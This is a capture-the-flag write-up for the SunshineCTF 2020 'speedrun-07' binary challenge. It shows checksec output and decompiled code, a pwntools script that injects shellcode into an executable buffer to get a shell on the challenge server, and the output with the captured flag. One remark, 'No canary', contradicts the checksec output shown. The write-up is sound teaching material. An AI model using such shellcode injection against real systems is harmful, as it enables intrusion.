# **speedrun-07**
## Task
nc chal.2020.sunshinectf.org 30007
File: chall_07
Tag: binary exploitation 

## Solution

### Checksec
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```
* NX disabled and has RWX assume inject shellcode
* System 64 bit
### Decompile with ghidra
```c
void main(void)
{
  long in_FS_OFFSET;
  char local_f8 [32];
  undefined local_d8 [200];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("In the land of raw humanity");
  fgets(local_f8,0x13,stdin);
  fgets(local_d8,200,stdin);
  (*(code *)local_d8)();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
No canary so no BOF here,But NX disabled so we can write out the shellcode to `local_8d` and `(*(code *)local_d8)();` will help us to execute the shellcode. Just a pieces challenge !!

### Exploit
```python
from pwn import *
binary = context.binary = ELF('./chall_07')
p = remote('chal.2020.sunshinectf.org',30007)
p.sendline('IxZ')
payload = asm(shellcraft.sh())
p.sendline(payload)
p.interactive()
```

### Output
```bash
[*] '/home/kali/speedrun_sunshineCTF2020/chall_07'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to chal.2020.sunshinectf.org on port 30007: Done
[*] Switching to interactive mode
In the land of raw humanity$ ls
chall_07
flag.txt
$ cat flag.txt
sun{sidewinder-a80d0be1840663c4}
$ 
```